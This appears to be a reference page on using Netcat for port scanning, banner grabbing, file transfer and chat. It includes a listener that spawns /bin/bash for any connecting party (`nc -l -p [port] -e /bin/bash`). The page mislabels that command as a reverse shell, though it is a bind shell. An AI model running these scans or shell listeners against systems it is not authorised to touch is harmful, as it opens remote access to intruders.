---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Netcat

Netcat, or `nc`, serves as a versatile command-line utility for port scanning, allowing users to check the availability of services on a target system.

* **Basic TCP Port Scan:**

```bash
nc -zv [hostname] [start-port]-[end-port]
```

&#x20;Conducts a basic TCP port scan on the specified hostname within a defined port range, revealing open ports.

*   **UDP Port Scan:**

    ```bash
    nc -uzv [hostname] [start-port]-[end-port]
    ```

    Performs a UDP port scan on the specified hostname within a defined port range, identifying open UDP ports.

**Banner Grabbing:**

*   **Retrieve Service Banner:**

    ```bash
    nc -v [hostname] [port]
    ```

    Connects to the specified port on the target system, displaying information from the service banner for identification.

**TCP Connection Test:**

*   **Full TCP Connection Test:**

    ```bash
    nc -v [hostname] [port]
    ```

    Initiates a full TCP connection to the specified port, providing detailed connection information.

**Reverse Shell:**

*   **Set up Reverse Shell (Listener):**

    ```bash
    nc -l -p [port] -e /bin/bash
    ```

    Sets up netcat as a listener, waiting for an incoming connection and spawning a shell on successful connection.
*   **Initiate Reverse Shell (Initiator):**

    ```bash
    nc [listener-hostname] [port]
    ```

    Initiates a connection to a netcat listener, potentially providing remote shell access.

**File Transfer:**

*   **Receive File (TCP):**

    ```bash
    nc -l -p [port] > [output-file]
    ```

    Listens on a specified port for incoming data and saves it to a file, useful for receiving files via TCP.
*   **Send File (TCP):**

    ```bash
    nc [receiver-hostname] [port] < [input-file]
    ```

    Connects to a netcat listener and sends the contents of a file to the receiver via TCP.

**Chat Mode (Two-way Communication):**

*   **Initiate Chat Mode (TCP):**

    ```bash
    nc -l -p [port]   # On one terminal
    nc [hostname] [port]  # On another terminal
    ```

    Enables a simple chat mode for exchanging data between two terminals using TCP.

**Summary:**

```bash
Usage: nc [options] [hostname] [port]
```

**Options:**

* `-l`: Listen mode, for inbound connects
* `-p port`: Specify source port to use
* `-e command`: Execute command after connect
* `-s addr`: Local source address
* `-v`: Verbose
* `-w timeout`: Connect timeout
* `-z`: Zero-I/O mode (scanning but sends no data)
* `-u`: UDP mode (unreliable since many firewalls drop ICMP packets).
* `-o file`: hex dump file of traffic

**Examples:**

* `nc -l -p 1234`: Listen on port 1234 for incoming connections
* `nc -l -p 1234 -e /bin/bash`: Listen on port 1234 and execute /bin/bash on incoming connection
* `nc -v -z example.com 80-100`: Perform a verbose port scan on example.com from ports 80 to 100

{% hint style="info" %}
&#x20;Netcat supports both TCP and UDP connections. The `-z` flag makes it operate in scanning mode, while the `-u` flag specifies UDP. The `-e` flag allows execution of a specified command upon connection.
{% endhint %}

**Resources:**

* [https://nmap.org/ncat/](https://nmap.org/ncat/)
